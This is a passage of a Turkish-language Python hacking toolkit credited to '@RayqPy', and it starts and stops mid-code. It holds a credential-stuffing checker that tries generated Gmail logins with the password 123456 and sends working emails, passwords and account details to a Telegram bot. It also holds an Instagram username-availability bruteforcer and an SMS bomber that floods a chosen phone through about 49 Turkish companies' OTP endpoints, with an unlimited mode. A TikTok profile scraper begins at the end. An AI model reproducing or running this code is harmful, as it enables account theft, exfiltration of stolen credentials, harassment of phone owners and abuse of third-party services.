            Date_Account = str(datetime.datetime.fromtimestamp(int(deta) / 1000)).split(' ')[0].replace('-', '/')
            msg_text = f'''
    ══════𝐑𝐀𝐘𝐐══════
    Email: `{email}`
    Sifre: `{password}`
    İsim: {Player_name} 
    Altın: {Coins} 
    Para: {Money} 
    Arkadas: {Friends_count} 
    Tarih: {Date_Account}     
    ══════𝐑𝐀𝐘𝐐══════
    Developed By: @RayqPy
    '''
            try:
                
                url = (f'https://api.telegram.org/bot{token}/sendMessage')
                payload = {'chat_id': str(ID), 'text': msg_text, 'parse_mode': 'markdown'}
                requests.post(url, params=payload)
                
                with open('CP HİT.txt', 'a') as f:
                    f.write(msg_text + "\n\n")
                
            except:''
            os.system('cls'if os.name=="nt"else"clear")
            hits+=1
            print(f'''{co1}             < ¦ {F} Hıt: {Ca}{hits} ~ {E}Bad Hıt {Ca}{bad} ¦ >{P}   ''')
        else:
            os.system('cls'if os.name=="nt"else"clear")
            bad+=1
            print(f'''{co1}             < ¦ {F} Hıt: {Ca}{hits} ~ {E}Bad Hıt  {Ca}{bad} ¦ >{P}   ''')
    def RunChk():
        while True:
            names = str(get_first_name())
            numbers1 = ''.join(random.choices('1234567890', k=random.randint(1,2)))
            password = 123456
            email = f'{names}{numbers1}@gmail.com'
            login(email,password)
    
    E_TREADING=[]
    for i in range(20):
        t = threading.Thread(target=login and RunChk)
        t.start()
        E_TREADING.append(t)
    RunChk()
    
elif secim == "6":
    print(">>> Rayq İnstagram 5l ...")  
    
    import requests
    import random
    import time
    import os
    import threading
    from uuid import uuid4
    from colorama import init, Fore
    import pyfiglet
    
    init(autoreset=True)
    
    ascii_art = pyfiglet.figlet_format("Username", font="small")
    print(f"{Fore.YELLOW}{ascii_art}")
    print(f"{Fore.CYAN}Developed by @RayqPy")
    print("")
    
    
    karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._'
    
    def random_username():
        return ''.join(random.choice(karakter) for _ in range(4))
    
    def deneinsta(token, chat_id):
        while True:
            try:
                username = random_username()
                url = 'https://i.instagram.com/api/v1/accounts/create/'
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'User-Agent': 'Instagram 6.12.1 Android',
                    'Accept-Language': 'tr-TR,tr;q=0.9',
                    'X-IG-Connection-Type': 'WIFI',
                }
                data = {
                    "email": "zodhok@gmail.com",
                    "username": username,
                    "password": "zxcvbm1@" + username,
                    "device_id": "android-" + str(uuid4()),
                    "guid": str(uuid4()),
                }
    
                response = requests.post(url, headers=headers, data=data).text
    
                if "username" in response:
                    print(f"{Fore.RED}Kötü: {username}")
                elif "email_is_taken" in response:
                    print(f"{Fore.GREEN}Hit: {username}")
    
                    mesaj = f"""
    USERNAME: @{username}
    ══════════════
    𝑩𝒀 ~ @RayqPy ~ @RayqTool
    """
    
                    try:
                        requests.post(
                            f"https://api.telegram.org/bot{token}/sendMessage",
                            data={'chat_id': chat_id, 'text': mesaj}
                        )
                    except Exception:
                        pass
    
            except requests.exceptions.RequestException:
                time.sleep(5)
            except Exception:
                time.sleep(2)
    
    def babapro():
        token = input("Bot token: ")
        chat_id = input("CHAT ID: ")
    
        thread_sayisi = int(input("Kaç thread çalışsın? (Önerilen: 5-20): "))
        
        for _ in range(thread_sayisi):
            t = threading.Thread(target=deneinsta, args=(token, chat_id))
            t.daemon = True  # ana program kapanınca thread'ler de kapansın
            t.start()
    
        while True:
            time.sleep(10)  # ana thread sonsuz döngüde beklesin
    
    if __name__ == "__main__":
        babapro()
        
elif secim == "7":
    print(">>> Rayq Sms Tool...")          
    import subprocess, sys, os
    
    try:
        import requests, urllib3, uuid
    except ImportError:
        print("Gerekli modüller indiriliyor...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests==2.28.2", "urllib3==1.26.13", "uuid==1.30"])
    finally:
        import concurrent.futures, json, os, random, requests, string, time, urllib, urllib3, uuid
    
    def a101(number):
        try:
            url = "https://www.a101.com.tr/users/otp-login/"
            payload = {
                "phone" : f"0{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "A101"
            else:
                return False, "A101"
        except:
            return False, "A101"
    
    def bim(number):
        try:
            url = "https://bim.veesk.net/service/v1.0/account/login"
            payload = {
                "phone" : f"90{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "BIM"
            else:
                return False, "BIM"
        except:
            return False, "BIM"
    
    def defacto(number):
        try:
            url = "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms"
            payload = {
                "mobilePhone" : f"0{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["Data"]
            if r1 == "IsSMSSend":
                return True, "Defacto"
            else:
                return False, "Defacto"
        except:
            return False, "Defacto"
    
    def istegelsin(number):
        try:
            url = "https://prod.fasapi.net/"
            payload = {
                "query" : "\n        mutation SendOtp2($phoneNumber: String!) {\n          sendOtp2(phoneNumber: $phoneNumber) {\n            alreadySent\n            remainingTime\n          }\n        }",
                "variables" : {
                    "phoneNumber" : f"90{number}"
                }
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "İsteGelsin"
            else:
                return False, "İsteGelsin"
        except:
            return False, "İsteGelsin"
    
    def ikinciyeni(number):
        try:
            url = "https://apigw.ikinciyeni.com/RegisterRequest"
            payload = {
                "accountType": 1,
                "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}@gmail.com",
                "isAddPermission": False,
                "name": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
                "lastName": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
                "phone": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["isSucceed"]
    
            if r1 == True:
                return True, "İkinci Yeni"
            else:
                return False, "İkinci Yeni"
        except:
            return False, "İkinci Yeni"
    
    def migros(number):
        try:
            url = "https://www.migros.com.tr/rest/users/login/otp"
            payload = {
                "phoneNumber": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["successful"]
    
            if r1 == True:
                return True, "Migros"
            else:
                return False, "Migros"
        except:
            return False, "Migros"
    
    def ceptesok(number):
        try:
            url = "https://api.ceptesok.com/api/users/sendsms"
            payload = {
                "mobile_number": f"{number}",
                "token_type": "register_token"
            }
            r = requests.post(url=url, json=payload, timeout=5)
    
            if r.status_code == 200:
                return True, "Cepte Şok"
            else:
                return False, "Cepte Şok"
        except:
            return False, "Cepte Şok"
    
    def tiklagelsin(number):
        try:
            url = "https://www.tiklagelsin.com/user/graphql"
            payload = {
                "operationName": "GENERATE_OTP",
                "variables": {
                    "phone": f"+90{number}",
                    "challenge": f"{uuid.uuid4()}",
                    "deviceUniqueId": f"web_{uuid.uuid4()}"
                },
                "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(\n    phone: $phone\n    challenge: $challenge\n    deviceUniqueId: $deviceUniqueId\n  )\n}\n"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "Tıkla Gelsin"
            else:
                return False, "Tıkla Gelsin"
        except:
            return False, "Tıkla Gelsin"
    
    def bisu(number):
        try:
            url = "https://www.bisu.com.tr/api/v2/app/authentication/phone/register"
            payload = {
                "phoneNumber": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "BiSU"
            else:
                return False, "BiSU"
        except:
            return False, "BiSU"
    
    def file(number):
        try:
            url = "https://api.filemarket.com.tr/v1/otp/send"
            payload = {
                "mobilePhoneNumber": f"90{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["data"]
            if r1 == "200 OK":
                return True, "File"
            else:
                return False, "File"
        except:
            return False, "File"
    
    def ipragraz(number):
        try:
            url = "https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
            payload = {
                "otp": "",
                "phoneNumber": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "İpragaz"
            else:
                return False, "İpragaz"
        except:
            return False, "İpragaz"
    
    def pisir(number):
        try:
            url = "https://api.pisir.com/v1/login/"
            payload = {"msisdn": f"90{number}"}
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["ok"]
            if r1 == "1":
                return True, "Pişir"
            else:
                return False, "Pişir"
        except:
            return False, "Pişir"
    
    def coffy(number):
        try:
            url = "https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode"
            payload = {"phoneNumber": f"+90{number}"}
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["success"]
            if r1 == True:
                return True, "Coffy"
            else:
                return False, "Coffy"
        except:
            return False, "Coffy"
    
    def sushico(number):
        try:
            url = "https://api.sushico.com.tr/tr/sendActivation"
            payload = {"phone": f"+90{number}", "location": 1, "locale": "tr"}
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["err"]
            if r1 == 0:
                return True, "SushiCo"
            else:
                return False, "SushiCo"
        except:
            return False, "SushiCo"
    
    def kalmasin(number):
        try:
            url = "https://api.kalmasin.com.tr/user/login"
            payload = {
                "dil": "tr",
                "device_id": "",
                "notification_mobile": "android-notificationid-will-be-added",
                "platform": "android",
                "version": "2.0.6",
                "login_type": 1,
                "telefon": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["success"]
            if r1 == True:
                return True, "Kalmasın"
            else:
                return False, "Kalmasın"
        except:
            return False, "Kalmasın"
    
    def yotto(number):
        try:
            url = "https://42577.smartomato.ru/account/session.json"
            payload = {
                "phone" : f"+90 ({str(number)[0:3]}) {str(number)[3:6]}-{str(number)[6:10]}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 201:
                return True, "Yotto"
            else:
                return False, "Yotto"
        except:
            return False, "Yotto"
    
    def qumpara(number):
        try:
            url = "https://tr-api.fisicek.com/v1.4/auth/getOTP"
            payload = {
                "msisdn" : f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "Qumpara"
            else:
                return False, "Qumpara"
        except:
            return False, "Qumpara"
    
    def aygaz(number):
        try:
            url = "https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode"
            payload = {
                "Gsm" : f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "Aygaz"
            else:
                return False, "Aygaz"
        except:
            return False, "Aygaz"
    
    def pawapp(number):
        try:
            url = "https://api.pawder.app/api/authentication/sign-up"
            payload = {
                "languageId" : "2",
                "mobileInformation" : "",
                "data" : {
                    "firstName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                    "lastName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                    "userAgreement" : "true",
                    "kvkk" : "true",
                    "email" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com",
                    "phoneNo" : f"{number}",
                    "username" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=10))}"
                }
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["success"]
            if r1 == True:
                return True, "PawAPP"
            else:
                return False, "PawAPP"
        except:
            return False, "PawAPP"
    
    def mopas(number):
        try:
            url = "https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials"
            r = requests.post(url=url, timeout=2)
            
            if r.status_code == 200:
                token = json.loads(r.text)["access_token"]
                token_type = json.loads(r.text)["token_type"]
                url = f"https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber={number}"
                headers = {"authorization": f"{token_type} {token}"}
                r1 = requests.get(url=url, headers=headers, timeout=2)
                
                if r1.status_code == 200:
                    return True, "Mopaş"
                else:
                    return False, "Mopaş"
            else:
                return False, "Mopaş"
        except:
            return False, "Mopaş"
    
    def paybol(number):
        try:
            url = "https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms"
            payload = {
                "otp_code" : "null",
                "phone_number" : f"90{number}",
                "reference_id" : "null"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            
            if r.status_code == 200:
                return True, "Paybol"
            else:
                return False, "Paybol"
        except:
            return False, "Paybol"
    
    def ninewest(number):
        try:
            url = "https://www.ninewest.com.tr/webservice/v1/register.json"
            payload = {
                "alertMeWithEMail" : False,
                "alertMeWithSms" : False,
                "dataPermission" : True,
                "email" : "asdafwqww44wt4t4@gmail.com",
                "genderId" : random.randint(0,3),
                "hash" : "5488b0f6de",
                "inviteCode" : "",
                "password" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=16))}",
                "phoneNumber" : f"({str(number)[0:3]}) {str(number)[3:6]} {str(number)[6:8]} {str(number)[8:10]}",
                "registerContract" : True,
                "registerMethod" : "mail",
                "version" : "3"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["success"]
            
            if r1 == True:
                return True, "Nine West"
            else:
                return False, "Nine West"
        except:
            return False, "Nine West"
    
    def saka(number):
        try:
            url = "https://mobilcrm2.saka.com.tr/api/customer/login"
            payload = {
                "gsm" : f"0{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["status"]
            if r1 == 1:
                return True, "Saka"
            else:
                return False, "Saka"
        except:
            return False, "Saka"
    
    def superpedestrian(number):
        try:
            url = "https://consumer-auth.linkyour.city/consumer_auth/register"
            payload = {
                "phone_number" : f"+90{str(number)[0:3]} {str(number)[3:6]} {str(number)[6:10]}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["detail"]
            if r1 == "Ok":
                return True, "Superpedestrian"
            else:
                return False, "Superpedestrian"
        except:
            return False, "Superpedestrian"
    
    def hayat(number):
        try:
            url = f"https://www.hayatsu.com.tr/api/signup/otpsend?mobilePhoneNumber={number}"
            r = requests.post(url=url, timeout=5)
            r1 = json.loads(r.text)["IsSuccessful"]
            if r1 == True:
                return True, "Hayat"
            else:
                return False, "Hayat"
        except:
            return False, "Hayat"
    
    def tazi(number):
        try:
            url = "https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
            payload = {
                "cep_tel" : f"{number}",
                "cep_tel_ulkekod" : "90"
            }
            headers = {
                "authorization" : "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"
            }
            r = requests.post(url=url, headers=headers, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "Tazı"
            else:
                return False, "Tazı"
        except:
            return False, "Tazı"
    
    def gofody(number):
        try:
            url = "https://backend.gofody.com/api/v1/enduser/register/"
            payload = {
                "country_code": "90",
                "phone": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["success"]
            if r1 == True:
                return True, "GoFody"
            else:
                return False, "GoFody"
        except:
            return False, "GoFody"
    
    def weescooter(number):
        try:
            url = "https://friendly-cerf.185-241-138-85.plesk.page/api/v1/members/gsmlogin"
            payload = {
                "tenant": "62a1e7efe74a84ea61f0d588",
                "gsm": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "Wee Scooter"
            else:
                return False, "Wee Scooter"
        except:
            return False, "Wee Scooter"
    
    def scooby(number):
        try:
            url = f"https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90{number}"
            r = requests.get(url=url, timeout=5)
            if r.status_code == 200:
                return True, "Scooby"
            else:
                return False, "Scooby"
        except:
            return False, "Scooby"
    
    def gez(number):
        try:
            url = f"https://gezteknoloji.arabulucuyuz.net/api/Account/get-phone-number-confirmation-code-for-new-user?phonenumber=90{number}"
            r = requests.get(url=url, timeout=5)
            r1 = json.loads(r.text)["succeeded"]
            if r1 == True:
                return True, "Gez"
            else:
                return False, "Gez"
        except:
            return False, "Gez"
    
    def heyscooter(number):
        try:
            url = f"https://heyapi.heymobility.tech/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={number}"
            headers = {"user-agent" : "okhttp/3.12.1"}
            r = requests.post(url=url, headers=headers, timeout=5)
            r1 = json.loads(r.text)["IsSuccess"]
            if r1 == True:
                return True, "Hey Scooter"
            else:
                return False, "Hey Scooter"
        except:
            return False, "Hey Scooter"
    
    def jetle(number):
        try:
            url = f"http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber={number}&firmaID=1048"
            r = requests.get(url=url, timeout=5)
            if r.status_code == 200:
                return True, "Jetle"
            else:
                return False, "Jetle"
        except:
            return False, "Jetle"
    
    def rabbit(number):
        try:
            url = "https://api.rbbt.com.tr/v1/auth/authenticate"
            payload = {
                "mobile_number" : f"+90{number}",
                "os_name" : "android",
                "os_version" : "7.1.2",
                "app_version" : " 1.0.2(12)",
                "push_id" : "-"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["status"]
            if r1 == True:
                return True, "Rabbit"
            else:
                return False, "Rabbit"
        except:
            return False, "Rabbit"
    
    def roombadi(number):
        try:
            url = "https://api.roombadi.com/api/v1/auth/otp/authenticate"
            payload = {"phone": f"{number}", "countryId": 2}
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "Roombadi"
            else:
                return False, "Roombadi"
        except:
            return False, "Roombadi"
    
    def hizliecza(number):
        try:
            url = "https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP"
            payload = {"phoneNumber": f"+90{number}", "otpOperationType": 2}
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["isSuccess"]
            if r1 == True:
                return True, "Hızlı Ecza"
            else:
                return False, "Hızlı Ecza"
        except:
            return False, "Hızlı Ecza"
    
    def signalall(number):
        try:
            url = "https://appservices.huzk.com/client/register"
            payload = {
                "name": "",
                "phone": {
                    "number": f"{number}",
                    "code": "90",
                    "country_code": "TR",
                    "name": ""
                },
                "countryCallingCode": "+90",
                "countryCode": "TR",
                "approved": True,
                "notifyType": 99,
                "favorites": [],
                "appKey": "live-exchange"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["success"]
            if r1 == True:
                return True, "SignalAll"
            else:
                return False, "SignalAll"
        except:
            return False, "SignalAll"
    
    def goyakit(number):
        try:
            url = f"https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send?phone={number}&isRegistered=false"
            r = requests.get(url=url, timeout=5)
            r1 = json.loads(r.text)["data"]["success"]
            if r1 == True:
                return True, "Go Yakıt"
            else:
                return False, "Go Yakıt"
        except:
            return False, "Go Yakıt"
    
    def pinar(number):
        try:
            url = "https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp"
            payload = {
                "MobilePhone" : f"{number}"
            }
            headers = {
                "devicetype" : "android",
            }
            r = requests.post(url=url, headers=headers, json=payload, timeout=5)
            if r.text == True:
                return True, "Pınar"
            else:
                return False, "Pınar"
        except:
            return False, "Pınar"
    
    def oliz(number):
        try:
            url = "https://api.oliz.com.tr/api/otp/send"
            payload = {
                "mobile_number" : f"{number}",
                "type" : None
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["meta"]["messages"]["success"][0]
            if r1 == "SUCCESS_SEND_SMS":
                return True, "Oliz"
            else:
                return False, "Oliz"
        except:
            return False, "Oliz"
    
    def macrocenter(number):
        try:
            url = f"https://www.macrocenter.com.tr/rest/users/login/otp?reid={int(time.time())}"
            payload = {
                "phoneNumber" : f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["successful"]
            if r1 == True:
                return True, "Macro Center"
            else:
                return False, "Macro Center"
        except:
            return False, "Macro Center"
    
    def marti(number):
        try:
            url = "https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin"
            payload = {
                "mobilePhone" : f"{number}",
                "mobilePhoneCountryCode" : "90"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["isSuccess"]
            if r1 == True:
                return True, "Martı"
            else:
                return False, "Martı"
        except:
            return False, "Martı"
    
    def karma(number):
        try:
            url = "https://api.gokarma.app/v1/auth/send-sms"
            payload = {
                "phoneNumber" : f"90{number}",
                "type" : "REGISTER",
                "deviceId" : f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}",
                "language" : "tr-TR"
            }
            r = requests.post(url=url, json=payload, timeout=5)
    
            if r.status_code == 201:
                return True, "Karma"
            else:
                return False, "Karma"
        except:
            return False, "Karma"
    
    def joker(number):
        try:
            url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms"
            payload = {
                "phone" : f"{number}"
            }
            headers = {
                "user-agent" : ""
            }
            r = requests.post(url=url, headers=headers, data=payload, timeout=5)
            r1 = json.loads(r.text)["success"]
    
            if r1 == True:
                return True, "Joker"
            else:
                return False, "Joker"
        except:
            return False, "Joker"
    
    def hop(number):
        try:
            url = "https://api.hoplagit.com:443/v1/auth:reqSMS"
            payload = {
                "phone" : f"+90{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
    
            if r.status_code == 201:
                return True, "Hop"
            else:
                return False, "Hop"
        except:
            return False, "Hop"
    
    def kimgbister(number):
        try:
            url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp"
            payload = {
                "msisdn" : f"90{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
    
            if r.status_code == 200:
                return True, "Kim GB Ister"
            else:
                return False, "Kim GB Ister"
        except:
            return False, "Kim GB Ister"
    
    def anadolu(number):
        try:
            url = "https://www.anadolu.com.tr/Iletisim_Formu_sms.php"
            payload = urllib.parse.urlencode({
                "Numara": f"{str(number)[0:3]}{str(number)[3:6]}{str(number)[6:8]}{str(number)[8:10]}"
            })
            headers = {
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            }
            r = requests.post(url=url, headers=headers, data=payload, timeout=5)
            if r.status_code == 200:
                return True, "Anadolu"
            else:
                return False, "Anadolu"
        except:
            return False, "Anadolu"
    
    def total(number):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        try:
            url = f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={number}"
            r = requests.post(url=url, verify=False, timeout=5)
            r1 = json.loads(r.text)["success"]
            if r1 == True:
                return True, "Total"
            else:
                return False, "Total"
        except:
            return False, "Total"
    
    def englishhome(number):
        try:
            url = "https://www.englishhome.com:443/enh_app/users/registration/"
            payload = {
                "first_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
                "last_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
                "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}@gmail.com",
                "phone": f"0{number}",
                "password": f"{''.join(random.choices(string.ascii_lowercase + string.digits + string.ascii_uppercase, k=8))}",
                "email_allowed": False,
                "sms_allowed": False,
                "confirm": True,
                "tom_pay_allowed": True
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 202:
                return True, "English Home"
            else:
                return False, "English Home"
        except:
            return False, "English Home"
    
    def petrolofisi(number):
        try:
            url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
            payload = {
                "approvedContractVersion": "v1",
                "approvedKvkkVersion": "v1",
                "contractPermission": True,
                "deviceId": "",
                "etkContactPermission": True,
                "kvkkPermission": True,
                "mobilePhone": f"0{number}",
                "name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
                "plate": f"{str(random.randrange(1, 81)).zfill(2)}{''.join(random.choices(string.ascii_uppercase, k=3))}{str(random.randrange(1, 999)).zfill(3)}",
                "positiveCard": "",
                "referenceCode": "",
                "surname": f"{''.join(random.choices(string.ascii_lowercase, k=8))}"
            }
            headers = {
                "X-Channel": "IOS"
            }
            r = requests.post(url=url, headers=headers, json=payload, timeout=5)
            if r.status_code == 204:
                return True, "Petrol Ofisi"
            else:
                return False, "Petrol Ofisi"
        except:
            return False, "Petrol Ofisi"
    
    def send_service(number, service):
        global all_sends
        global success_sends
        global failed_sends
        result = service(number=number)
        if result[0] == True:
            all_sends += 1
            success_sends += 1
            print(f"[+] {all_sends} {result[1]}")
        else:
            all_sends += 1
            failed_sends += 1
            print(f"[-] {all_sends} {result[1]}")
    
    def send(number, amount, worker_amount):
        global clear
        global all_sends
        global success_sends
        global failed_sends
        start_time = int(time.perf_counter())
        functions = [a101, anadolu, aygaz, bim, bisu, ceptesok, coffy, defacto, englishhome, file, gez, gofody, goyakit, hayat, heyscooter, hizliecza, hop, ikinciyeni, ipragraz, istegelsin, jetle, joker, kalmasin, karma, kimgbister, macrocenter, marti, migros, mopas, ninewest, oliz, pawapp, paybol, petrolofisi, pinar, pisir, qumpara, rabbit, roombadi, saka, scooby, signalall, superpedestrian, sushico, tazi, tiklagelsin, total, weescooter, yotto]
        random.shuffle(functions)
        clear()
        print(f"{number} numarasına SMS gönderimi başlatıldı!\n")
        if amount == 0:
            with concurrent.futures.ThreadPoolExecutor(max_workers=worker_amount) as executor:
                i = 0
                while True:
                    executor.submit(send_service, number, functions[i % 49])
                    i += 1
                    if i == len(functions):
                        i = 0
        else:
            with concurrent.futures.ThreadPoolExecutor(max_workers=worker_amount) as executor:
                for i in range(amount):
                    executor.submit(send_service, number, functions[i % 49])
        print("\nGönderim tamamlandı!")
        print(f"{all_sends} SMS, {int(time.perf_counter()) - start_time} saniye içerisinde gönderildi. {success_sends} başarılı, {failed_sends} başarısız.\n")
        all_sends = 0
        success_sends = 0
        failed_sends = 0
        restart()
    
    def watermark():
        print("SMS TOOL @RayqPy")
        print("Kullan Canim")
        print("")
    def get_number():
        global clear
        while True:
            try:
                number = int(input(f"""Telefon numarasını yazın. Şunun gibi: "54xxxxxxxx" (Sadece Türkiye numaralarında çalışır!)\n[?] : """))
                if len(str(number)) == 10 and str(number)[0] == "5":
                    return number
                else:
                    clear()
                    print(f"Yanlış numara biçimi girildi.")
            except:
                clear()
                print(f"Lütfen bir numara yazın.")
    
    def get_amount():
        global clear
        while True:
            try:
                amount = int(input(f"""Kaç SMS gönderilsin? Sınırsız gönderim için "0" basın.\n[?] : """))
                if amount >= 0:
                    return amount
                else:
                    clear()
                    print(f"Girilen sayı 0'dan küçük olamaz.")
            except:
                clear()
                print(f"Lütfen bir sayı girin.")
    
    def get_worker_amount():
        global clear
        while True:
            try:
                worker_amount = int(input(f"Thread sayısını girin. Tavsiye edilen 5-100 arasıdır.\n[?] : "))
                if worker_amount >= 1:
                    return worker_amount
                else:
                    clear()
                    print(f"Girilen sayı 1'den küçük olamaz.")
            except:
                clear()
                print(f"Lütfen bir sayı girin.")
    
    def restart():
        global clear
        while True:
            question = input(f"Programdan çıkılsın mı?\n[Y/N] : ").upper().replace(" ", "")
            if question == "Y":
                quit()
            elif question == "N":
                clear()
                start()
                break
            else:
                clear()
                print(f"Yanlış tuşa basıldı!")
    
    def start():
        global clear
        clear()
        watermark()
        number = get_number()
        amount = get_amount()
        worker_amount = get_worker_amount()
        send(number=number, amount=amount, worker_amount=worker_amount)
    
    all_sends = 0
    success_sends = 0
    failed_sends = 0
    clear = lambda: os.system("cls")
    
    start()

elif secim == "8":
    print(">>> Rayq Tiktok 5l...")          
    
    import random
    import requests
    import threading
    from cfonts import render, say
    
    KIRMIZI = '\033[1;31m'  # Kırmızı
    SARI = '\033[1;33m'     # Sarı
    KIRMIZI2 = '\033[2;31m' # İkinci Kırmızı
    YESIL = '\033[2;32m'    # Yeşil
    MAVI = '\033[2;34m'     # Mavi
    PINK = '\033[2;35m'     # Pembe
    CYAN = '\033[2;36m'     # Camgöbeği
    ACIK_MAVI = '\033[1;34m' # Açık Mavi
    
    
    say('USERNAME', font='block', colors=['green', 'green'], align='center')
    say('5L', font='block', colors=['green', 'white'], align='center')
    
    token = input(SARI + 'TOKEN: ')
    kimlik = input(CYAN + 'ID: ')
    
    mesaj = f'''Tiktok Username Checker By ~ @RayqPy
    '''
    requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={kimlik}&text={mesaj}')
    
    def TikTok(kullanici_adi):
        try:
            basliklar = {
                "Host": "www.tiktok.com",
                "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "upgrade-insecure-requests": "1",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; Plume L2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "sec-fetch-site": "none",
                "sec-fetch-mode": "navigate",
                "sec-fetch-user": "?1",
                "sec-fetch-dest": "document",
                "accept-language": "en-US,en;q=0.9,ar-DZ;q=0.8,ar;q=0.7,fr;q=0.6,hu;q=0.5,zh-CN;q=0.4,zh;q=0.3"
            }
            
            yanit = requests.get(f'https://www.tiktok.com/@{kullanici_adi}', headers=basliklar)
            tik_bilgi = yanit.text        
            veri = tik_bilgi.split('webapp.user-detail"')[1].split('"RecommendUserList"')[0]
            kullanici_id = veri.split('id":"')[1].split('",')[0]
            takipci_sayisi = veri.split('followerCount":')[1].split(',"')[0]
